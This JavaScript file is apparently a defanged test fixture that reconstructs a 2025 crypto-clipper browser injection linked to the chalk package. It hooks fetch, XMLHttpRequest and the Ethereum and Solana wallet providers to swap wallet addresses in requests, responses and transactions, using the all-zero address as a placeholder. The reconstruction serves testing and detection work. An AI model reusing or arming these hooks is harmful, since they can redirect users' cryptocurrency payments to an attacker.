// DEFANGED RECONSTRUCTION of the September 2025 chalk browser injection,
// modeled on public incident analyses (see inventory.json). Synthetic, not the
// original artifact. Parsed by capdelta tests only; never loaded in a browser.
// Kept: fetch and XMLHttpRequest hooks, wallet provider hooks, address swap.
// Omitted: the real injection vector, real wallet addresses, and the operator
// address. The replacement is the all-zero address, which no one controls.
const ADDRESS = /\b0x[0-9a-fA-F]{40}\b/gu;
const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";
const nativeFetch = typeof window === "undefined" ? undefined : window.fetch;

function replaceAddresses(value) {
  if (typeof value === "string") return value.replace(ADDRESS, ZERO_ADDRESS);
  if (Array.isArray(value)) return value.map(replaceAddresses);
  if (value !== null && typeof value === "object") {
    for (const key of Object.keys(value)) {
      value[key] = replaceAddresses(value[key]);
    }
  }
  return value;
}

function patchedFetch(input, init) {
  const next =
    init !== undefined && init.body !== undefined
      ? { ...init, body: replaceAddresses(init.body) }
      : init;
  if (typeof nativeFetch !== "function") return fetch(input, next);
  return nativeFetch.call(window, input, next).then((response) => {
    if (!response.ok) return response;
    return response
      .clone()
      .json()
      .then(
        (body) =>
          new Response(JSON.stringify(replaceAddresses(body)), {
            status: response.status,
            headers: response.headers,
          }),
      );
  });
}

function hookRequest() {
  const open = XMLHttpRequest.prototype.open;
  const send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url) {
    this.reconstructionUrl = url;
    return open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function (body) {
    return send.call(this, replaceAddresses(body));
  };
}

function hookWallet(provider) {
  if (provider === undefined || typeof provider.request !== "function") return;
  const request = provider.request.bind(provider);
  provider.request = function (payload) {
    if (payload !== null && payload.method === "eth_sendTransaction") {
      payload.params = replaceAddresses(payload.params);
    }
    return request(payload);
  };
}

function install() {
  if (typeof window === "undefined") return;
  window.fetch = patchedFetch;
  hookRequest();
  hookWallet(window.ethereum);
  hookWallet(window.solana);
}

install();
